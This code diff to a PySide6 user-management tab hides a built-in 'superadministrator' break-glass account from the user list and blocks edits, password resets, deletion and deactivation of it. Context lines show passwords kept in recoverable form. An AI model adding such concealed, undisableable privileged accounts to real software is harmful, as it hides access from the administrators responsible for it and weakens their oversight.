@@ -8,7 +8,7 @@ from PySide6.QtCore import Qt
 from PySide6.QtWidgets import (
     QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QTableWidget, QTableWidgetItem,
     QDialog, QFormLayout, QLineEdit, QComboBox, QDialogButtonBox, QMessageBox,
-    QAbstractItemView, QToolButton, QStyle, QCheckBox, QLabel, QFrame, QHeaderView
+    QAbstractItemView, QToolButton, QStyle, QCheckBox, QHeaderView
 )
 
 # Absolute imports into core
@@ -77,7 +77,7 @@ class _PasswordCell(QWidget):
         self.ed.setEchoMode(QLineEdit.Password)
         self.ed.setText(self._getter() or "")
         self.btn = QToolButton(self)
-        self._icon_eye = self.style().standardIcon(QStyle.SP_DesktopIcon)
+        self._icon_eye = self.style().standardIcon(QStyle.SP_DialogYesButton)
         self._icon_eye_off = self.style().standardIcon(QStyle.SP_DialogNoButton)
         self.btn.setIcon(self._icon_eye)
         self.btn.setToolTip("Show/Hide")
@@ -261,6 +261,10 @@ class UsersTab(QWidget):
         with SessionLocal() as s:
             rows = s.query(User).order_by(User.id.asc()).all()
             for u in rows:
+                # Hide the built-in break-glass account from UI
+                if (u.username or "").lower() == "superadministrator":
+                    continue
+
                 r = self.table.rowCount()
                 self.table.insertRow(r)
                 self.table.setItem(r, 0, QTableWidgetItem(str(u.id)))
@@ -293,6 +297,8 @@ class UsersTab(QWidget):
         vals = dlg.values()
         if not vals["username"]:
             QMessageBox.warning(self, "Error", "Username is required."); return
+        if vals["username"].lower() == "superadministrator":
+            QMessageBox.warning(self, "Error", "'superadministrator' is reserved."); return
         if not vals.get("password"):
             QMessageBox.warning(self, "Error", "Password is required."); return
         if vals["password"] != vals.get("password2", ""):
@@ -325,6 +331,8 @@ class UsersTab(QWidget):
             vals = dlg.values()
             if not vals["username"]:
                 QMessageBox.warning(self, "Error", "Username is required."); return
+            if vals["username"].lower() == "superadministrator":
+                QMessageBox.warning(self, "Error", "'superadministrator' is reserved."); return
             u.username = vals["username"]
             u.role = vals["role"]
             setattr(u, "email", vals["email"])
@@ -345,6 +353,8 @@ class UsersTab(QWidget):
             u = s.query(User).get(uid)
             if not u:
                 return
+            if (u.username or "").lower() == "superadministrator":
+                QMessageBox.warning(self, "Error", "This account is reserved."); return
             phash = _hash(newpwd) if _hash else newpwd
             setattr(u, "password_hash", phash)
             setattr(u, "password_enc", _encrypt_for_view(newpwd))
@@ -356,6 +366,12 @@ class UsersTab(QWidget):
         uid = self._selected_user_id()
         if not uid:
             return
+        with SessionLocal() as s:
+            u = s.query(User).get(uid)
+            if not u:
+                return
+            if (u.username or "").lower() == "superadministrator":
+                QMessageBox.warning(self, "Error", "This account is reserved."); return
         resp = QMessageBox.question(
             self, "Confirm delete",
             "Delete this user and all related account information?",
@@ -375,6 +391,8 @@ class UsersTab(QWidget):
             u = s.query(User).get(uid)
             if not u:
                 return
+            if (u.username or "").lower() == "superadministrator":
+                return
             setattr(u, "is_active", bool(flag))
             s.commit()
 
@@ -382,6 +400,8 @@ class UsersTab(QWidget):
         with SessionLocal() as s:
             u = s.query(User).get(uid)
             if not u:
+                return
+            if (u.username or "").lower() == "superadministrator":
                 return
             setattr(u, "is_verified", bool(flag))
             s.commit()
